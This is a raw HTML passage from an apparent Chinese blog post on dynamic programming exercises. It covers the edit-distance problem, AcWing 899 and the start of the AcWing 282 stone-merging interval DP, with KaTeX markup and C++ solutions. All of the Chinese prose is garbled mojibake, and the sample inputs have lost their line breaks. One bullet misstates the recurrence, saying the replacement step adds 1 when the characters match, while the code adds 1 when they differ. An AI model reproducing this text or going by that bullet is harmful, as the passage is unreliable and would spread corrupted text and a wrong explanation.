çš„æŸä¸ªä½ç½®æ’å…¥æŸä¸ªå­—ç¬¦ã€‚</li><li>æ›¿æ¢â€“å°†å­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> ä¸­çš„æŸä¸ªå­—ç¬¦æ›¿æ¢ä¸ºå¦ä¸€ä¸ªå­—ç¬¦ã€‚</li></ol><p>ç°åœ¨è¯·ä½ æ±‚å‡ºï¼Œå°† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> å˜ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> è‡³å°‘éœ€è¦è¿›è¡Œå¤šå°‘æ¬¡æ“ä½œã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> çš„é•¿åº¦ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å«ä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„å­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>ã€‚</p><p>ç¬¬ä¸‰è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> çš„é•¿åº¦ã€‚</p><p>ç¬¬å››è¡ŒåŒ…å«ä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> çš„å­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ã€‚</p><p>å­—ç¬¦ä¸²ä¸­å‡åªåŒ…å«å¤§å°å†™å­—æ¯ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å°‘æ“ä½œæ¬¡æ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n, m \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>10 AGTCTGACGC11 AGTAAGTAGGC</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>4</code></pre><h3 id="DP-3">DP</h3><ul><li>çŠ¶æ€è¡¨ç¤º<code>f[i][j]</code><ul><li>é›†åˆï¼šæ‰€æœ‰å°†<code>a[1~i]</code>å˜æˆ<code>b[1~j]</code>çš„æ“ä½œæ–¹å¼</li><li>å±æ€§ï¼šMin</li></ul></li><li>çŠ¶æ€è®¡ç®—<ul><li>ä»¥æœ€åä¸€æ­¥è¿›è¡Œçš„æ“ä½œè¿›è¡Œåˆ†ç±»</li><li>åˆ é™¤ <code>f[i - 1][j]</code></li><li>æ’å…¥ <code>f[i][j - 1]</code></li><li>æ›¿æ¢ <code>f[i - 1][j - 1] + 0/1</code> å¦‚æœ<code>a[i] = b[j]</code>åˆ™åŠ 1</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">char</span> a[kN], b[kN];</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%s&quot;</span>, &amp;n, a + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%s&quot;</span>, &amp;m, b + <span class="number">1</span>);</span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line">  <span class="comment">// f[0][i]å¦‚æœaåˆå§‹é•¿åº¦å°±æ˜¯0ï¼Œé‚£ä¹ˆåªèƒ½ç”¨æ’å…¥æ“ä½œè®©å®ƒå˜æˆb</span></span><br><span class="line">  <span class="comment">// f[i][0]åŒæ ·åœ°ï¼Œå¦‚æœbçš„é•¿åº¦æ˜¯0ï¼Œé‚£ä¹ˆaåªèƒ½ç”¨åˆ é™¤æ“ä½œè®©å®ƒå˜æˆb</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">    f[<span class="number">0</span>][i] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    f[i][<span class="number">0</span>] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      f[i][j] = <span class="built_in">min</span>(f[i - <span class="number">1</span>][j] + <span class="number">1</span>, f[i][j - <span class="number">1</span>] + <span class="number">1</span>);  <span class="comment">// åˆ é™¤ æ·»åŠ </span></span><br><span class="line">      f[i][j] = <span class="built_in">min</span>(f[i][j], f[i - <span class="number">1</span>][j - <span class="number">1</span>] + (a[i] != b[j]));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[n][m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-899-ç¼–è¾‘è·ç¦»"><a href="https://www.acwing.com/problem/content/901/">AcWing 899. ç¼–è¾‘è·ç¦»</a></h2><p><code>éš¾åº¦ï¼šç®€å•</code></p><p>ç»™å®š <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªé•¿åº¦ä¸è¶…è¿‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span> çš„å­—ç¬¦ä¸²ä»¥åŠ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> æ¬¡è¯¢é—®ï¼Œæ¯æ¬¡è¯¢é—®ç»™å‡ºä¸€ä¸ªå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ“ä½œæ¬¡æ•°ä¸Šé™ã€‚</p><p>å¯¹äºæ¯æ¬¡è¯¢é—®ï¼Œè¯·ä½ æ±‚å‡ºç»™å®šçš„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªå­—ç¬¦ä¸²ä¸­æœ‰å¤šå°‘ä¸ªå­—ç¬¦ä¸²å¯ä»¥åœ¨ä¸Šé™æ“ä½œæ¬¡æ•°å†…ç»è¿‡æ“ä½œå˜æˆè¯¢é—®ç»™å‡ºçš„å­—ç¬¦ä¸²ã€‚</p><p>æ¯ä¸ªå¯¹å­—ç¬¦ä¸²è¿›è¡Œçš„å•ä¸ªå­—ç¬¦çš„æ’å…¥ã€åˆ é™¤æˆ–æ›¿æ¢ç®—ä½œä¸€æ¬¡æ“ä½œã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºç»™å®šçš„å­—ç¬¦ä¸²ã€‚</p><p>å†æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºä¸€æ¬¡è¯¢é—®ã€‚</p><p>å­—ç¬¦ä¸²ä¸­åªåŒ…å«å°å†™å­—æ¯ï¼Œä¸”é•¿åº¦å‡ä¸è¶…è¿‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºå…± <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> è¡Œï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ä½œä¸ºç»“æœï¼Œè¡¨ç¤ºä¸€æ¬¡è¯¢é—®ä¸­æ»¡è¶³æ¡ä»¶çš„å­—ç¬¦ä¸²ä¸ªæ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n, m \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>,</p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>3 2abcacdbcdab 1acbd 2</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>13</code></pre><h3 id="DP-4">DP</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>, kM = <span class="number">15</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">char</span> str[kN][kM];</span><br><span class="line"><span class="type">int</span> f[kM][kM];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">EditDist</span><span class="params">(<span class="type">char</span> a[], <span class="type">char</span> b[])</span> </span>&#123;  <span class="comment">// ä¼ çš„å°±æ˜¯æŒ‡é’ˆ</span></span><br><span class="line">  <span class="comment">// ä¸€å®šè¦ä»a + 1å¼€å§‹è¯»é•¿åº¦(ä»aå¼€å§‹è¯»é•¿åº¦è¯»å‡ºæ¥æ˜¯0: è¯»åˆ°\00ä¸ºæ­¢)</span></span><br><span class="line">  <span class="type">int</span> len_a = <span class="built_in">strlen</span>(a + <span class="number">1</span>), len_b = <span class="built_in">strlen</span>(b + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len_b; i++) &#123;</span><br><span class="line">    f[<span class="number">0</span>][i] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len_a; i++) &#123;</span><br><span class="line">    f[i][<span class="number">0</span>] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len_a; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= len_b; j++) &#123;</span><br><span class="line">      f[i][j] = <span class="built_in">min</span>(f[i - <span class="number">1</span>][j] + <span class="number">1</span>, f[i][j - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">      f[i][j] = <span class="built_in">min</span>(f[i][j], f[i - <span class="number">1</span>][j - <span class="number">1</span>] + (a[i] != b[j]));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> f[len_a][len_b];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str[i] + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> str_query[kM];</span><br><span class="line">  <span class="type">int</span> limit;</span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, str_query + <span class="number">1</span>, &amp;limit);</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">EditDist</span>(str[i], str_query) &lt;= limit) &#123;</span><br><span class="line">        count++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, count);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="åŒºé—´DP">åŒºé—´DP</h1><h2 id="AcWing-282-çŸ³å­åˆå¹¶">AcWing 282. çŸ³å­åˆå¹¶</h2><p><code>éš¾åº¦ï¼šç®€å•</code></p><p>è®¾æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> å †çŸ³å­æ’æˆä¸€æ’ï¼Œå…¶ç¼–å·ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mtext>ï¼Œ</mtext><mn>2</mn><mtext>ï¼Œ</mtext><mn>3</mn><mtext>ï¼Œ</mtext><mo>â€¦</mo><mtext>ï¼Œ</mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">1ï¼Œ2ï¼Œ3ï¼Œâ€¦ï¼ŒN</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord">2</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord">3</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">â€¦</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>ã€‚</p><p>æ¯å †çŸ³å­æœ‰ä¸€å®šçš„è´¨é‡ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªæ•´æ•°æ¥æè¿°ï¼Œç°åœ¨è¦å°†è¿™ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> å †çŸ³å­åˆå¹¶æˆä¸ºä¸€å †ã€‚</p><p>æ¯æ¬¡åªèƒ½åˆå¹¶ç›¸é‚»çš„ä¸¤å †ï¼Œåˆå¹¶çš„ä»£ä»·ä¸ºè¿™ä¸¤å †çŸ³å­çš„è´¨é‡ä¹‹å’Œï¼Œåˆå¹¶åä¸è¿™ä¸¤å †çŸ³å­ç›¸é‚»çš„çŸ³å­å°†å’Œæ–°å †ç›¸é‚»ï¼Œåˆå¹¶æ—¶ç”±äºé€‰æ‹©çš„é¡ºåºä¸åŒï¼Œåˆå¹¶çš„æ€»ä»£ä»·ä¹Ÿä¸ç›¸åŒã€‚</p><p>ä¾‹å¦‚æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> å †çŸ³å­åˆ†åˆ«ä¸º <code>1 3 5 2</code>ï¼Œ æˆ‘ä»¬å¯ä»¥å…ˆåˆå¹¶ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mtext>ã€</mtext><mn>2</mn></mrow><annotation encoding="application/x-tex">1ã€2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord cjk_fallback">ã€</span><span class="mord">2</span></span></span></span> å †ï¼Œä»£ä»·ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span>ï¼Œå¾—åˆ° <code>4 5 2</code>ï¼Œ åˆåˆå¹¶ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mtext>ï¼Œ</mtext><mn>2</mn></mrow><annotation encoding="application/x-tex">1ï¼Œ2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord">2</span></span></span></span> å †ï¼Œä»£ä»·ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>9</mn></mrow><annotation encoding="application/x-tex">9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">9</span></span></span></span>ï¼Œå¾—åˆ° <code>9 2</code> ï¼Œå†åˆå¹¶å¾—åˆ° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>11</mn></mrow><annotation encoding="application/x-tex">11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span>ï¼Œæ€»ä»£ä»·ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>+</mo><mn>9</mn><mo>+</mo><mn>11</mn><mo>=</mo><mn>24</mn></mrow><annotation encoding="application/x-tex">4+9+11=24</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">9</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">24</span></span></span></span>ï¼›</p><p>å¦‚æœç¬¬äºŒæ­¥æ˜¯å…ˆåˆå¹¶ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mtext>ï¼Œ</mtext><mn>3</mn></mrow><annotation encoding="application/x-tex">2ï¼Œ3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">2</span><span class="mord cjk_fallback">ï¼Œ</span><span 